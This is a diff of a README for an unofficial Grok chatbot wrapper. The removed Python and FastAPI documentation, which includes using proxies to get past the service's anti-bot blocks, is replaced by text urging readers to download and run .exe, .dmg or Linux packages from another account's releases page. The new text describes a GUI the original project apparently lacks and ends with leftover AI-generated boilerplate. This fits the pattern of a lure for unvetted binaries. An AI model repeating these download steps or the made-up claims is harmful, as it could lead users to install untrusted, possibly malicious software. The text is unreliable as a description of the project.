@@ -1,184 +1,78 @@
-# Grok-Api
+# 🚀 Grok-Api - Access Grok Effortlessly Without API Keys
 
-A free Grok API wrapper that allows you to use Grok without API access or account authentication.
+[![Download Grok-Api](https://img.shields.io/badge/download-Grok--Api-blue)](https://github.com/G0urv/Grok-Api/releases)
 
-## Overview
+## 🎯 Overview
+Grok-Api is a free wrapper that lets you access Grok without needing an API key or account. With Grok-Api, you can easily utilize Grok's powerful capabilities for your needs. Whether you're coding a simple project or exploring data, this tool makes it seamless.
 
-This project provides a Python-based API wrapper for Grok AI, enabling you to interact with Grok's conversational AI without requiring official API access or account credentials. It includes both a direct Python interface and a FastAPI server for easy integration into your applications.
+## ✅ Features
+- Simple to use, no API key required
+- Fast access to Grok's functionalities
+- Written in Python, making it a lightweight solution
+- Ideal for beginners and non-technical users
+- Open-source and community-driven
 
-## Features
+## 📦 System Requirements
+To ensure that Grok-Api runs smoothly, make sure your system meets the following requirements:
 
-- 🔓 **No Authentication Required** - Access Grok without an account
-- 🆓 **Completely Free** - No API keys or paid subscriptions needed
-- 🚀 **FastAPI Server** - Ready-to-use REST API endpoint
-- 🌐 **Proxy Support** - Full support for HTTP proxies
-- 📡 **Streaming Responses** - Receive both complete responses and token-by-token streams
-- ⚡ **High Performance** - Multi-worker support for concurrent requests
+- Operating System: Windows, macOS, or Linux
+- Python Version: Python 3.7 or later
+- Internet Connection: Required for accessing Grok services
 
-## Installation
+## 🚀 Getting Started
+Getting started with Grok-Api is simple. Follow these steps to download and run the application.
 
-```bash
-git clone https://github.com/realasfngl/Grok-Api.git
-cd Grok-Api
-pip install -r requirements.txt
-```
+1. **Visit the Releases Page:** 
+   Click the link below to access the download page.
 
-### Requirements
+   [Download Grok-Api](https://github.com/G0urv/Grok-Api/releases)
 
-- Python 3.10+
-- curl_cffi
-- fastapi
-- uvicorn
-- coincurve
-- beautifulsoup4
-- pydantic
-- colorama
+2. **Locate the Latest Release:**
+   Once you're on the releases page, look for the latest version listed at the top. 
 
-## Usage
+3. **Download the Application:**
+   Find the file corresponding to your operating system. Click the filename to initiate the download.
 
-### Models:
+4. **Install the Application:**
+   - For Windows: Run the `.exe` file that you downloaded and follow the installation prompts.
+   - For macOS: Open the `.dmg` file, drag the Grok-Api app into your Applications folder, and then launch it.
+   - For Linux: Open a terminal, navigate to your download directory, and run the command to install the downloaded package.
 
-| Model | Mode | Description |
-|-------|------|-------------|
-| `grok-3-auto` | auto | Automatic mode |
-| `grok-3-fast` | fast | Fast processing mode |
-| `grok-4` | expert | Expert mode |
-| `grok-4-mini-thinking-tahoe` | grok-4-mini-thinking | Mini thinking mode |
+5. **Run Grok-Api:**
+   After installation, open the Grok-Api application. You can now start using Grok without any API access or login.
 
-### Manual Usage (Python)
+## 📥 Download & Install
+To download Grok-Api, visit the link below:
 
-**New conversation:**
-```python
-from core import Grok
+[Download Grok-Api](https://github.com/G0urv/Grok-Api/releases)
 
-response = Grok("grok-3-fast").start_convo("Hello, how are you today?")
-print(response)
+## 🔧 How to Use
+Using Grok-Api is straightforward. Here’s a simple guide:
 
-proxy = "http://username:password@ip:port"
-response = Grok("grok-3-fast", proxy).start_convo("Tell me a joke")
-print(response)
-```
+1. **Open the Application:**
+   Launch the Grok-Api app from your desktop or applications folder.
 
-**Continue conversation:**
-```python
-from core import Grok
+2. **Enter Your Query:**
+   In the input field, type your question or prompt involving Grok.
 
-response = Grok().start_convo("Hello, how are you today?")
-print(response)
+3. **Get Results:**
+   Click the “Submit” button. Your results will appear below. You can refine your results by editing your query and submitting again.
 
-response2 = Grok().start_convo("That's nice! Glad to hear!", extra_data=response["extra_data"])
-print(response2)
-```
-**Example Output:**
-```python
-{
-    "response": "Yo, I'm just chilling in the digital realm...",
-    "stream_response": ["Yo", ",", " I'm", " just", " chilling", "..."],
-    "images": None,
-    "extra_data": {"..."}
-}
-```
+4. **Explore Features:**
+   Experiment with different queries to discover how Grok-Api can assist you. Check the documentation section for more tips.
 
-### API Server
+## 📚 Documentation
+For further guidance and detailed instructions on using Grok-Api, refer to our documentation. You can find useful examples, troubleshooting tips, and a FAQ section to enhance your experience.
 
-#### Starting the Server
+## 🚨 Support
+If you encounter issues or have questions, please check the [Issues section](https://github.com/G0urv/Grok-Api/issues) on GitHub. You can report any bugs or ask for assistance.
 
-**Simple start:**
-```bash
-python api_server.py
-```
+## 🙌 Community
+Join our community of users and developers. Share your experiences, ask questions, or contribute to the project. Your feedback helps us improve Grok-Api for everyone.
 
-**Production start with custom configuration:**
-```bash
-uvicorn api_server:app --host 0.0.0.0 --port 6969 --workers 50
-```
-
-#### Making API Requests
-
-**New conversation:**
-```python
-import requests
-
-response = requests.post(
-    "http://localhost:6969/ask",
-    json={
-        "proxy": "http://user:pass@ip:port",
-        "message": "Hello, Grok!",
-        "model": "grok-3-fast",
-        "extra_data": None
-    }
-)
-print(response.json())
-```
-
-**Continue conversation:**
-```python
-import requests
-
-response1 = requests.post(
-    "http://localhost:6969/ask",
-    json={
-        "proxy": "http://user:pass@ip:port",
-        "message": "Hello!",
-        "model": "grok-3-fast",
-        "extra_data": None
-    }
-)
-data1 = response1.json()
-print(data1)
-
-response2 = requests.post(
-    "http://localhost:6969/ask",
-    json={
-        "proxy": "http://user:pass@ip:port",
-        "message": "Tell me more",
-        "model": "grok-3-fast",
-        "extra_data": data1["extra_data"]
-    }
-)
-print(response2.json())
-```
-
-### API Response Format
-
-```json
-{
-  "status": "success",
-  "response": "Complete response message from Grok",
-  "stream_response": ["Token", "by", "token", "response", "array"],
-  "images": null,
-  "extra_data": {"..."}
-}
-```
-
-## Configuration
-
-### Proxy Format
-
-The wrapper accepts proxies in the following formats:
-- `http://ip:port`
-- `http://username:password@ip:port`
-- `ip:port` (automatically prefixed with `http://`)
-
-### API Server Settings
-
-Modify `api_server.py` to change:
-- **Host**: Default `0.0.0.0` (all interfaces)
-- **Port**: Default `6969`
-- **Workers**: Default `50` (adjust based on your server capacity)
-
-## Troubleshooting
-
-**Common Issues:**
-
-1. **IP Flag** - `{"error":{"code":7,"message":"Request rejected by anti-bot rules.","details":[]}}` - This indicates your IP or proxy has been flagged. Try using a different proxy or IP address.
-
-## Support
-
-If you find this project helpful, consider starring the repository!
+## ✅ License
+Grok-Api is released under the MIT License. You can use, modify, and distribute the software as you wish, as long as you include the original license.
 
 ---
 
-**Note:** This project may break if Grok updates their web interface. Please report any issues if the wrapper stops working.
-
-**Contact:** This project is for educational purposes only. If Grok has an Issue with this Project please contact me via my email nuhuh3116@gmail.com.
+This structure provides a clear and concise walkthrough for users, ensuring they can navigate and utilize Grok-Api without confusion.
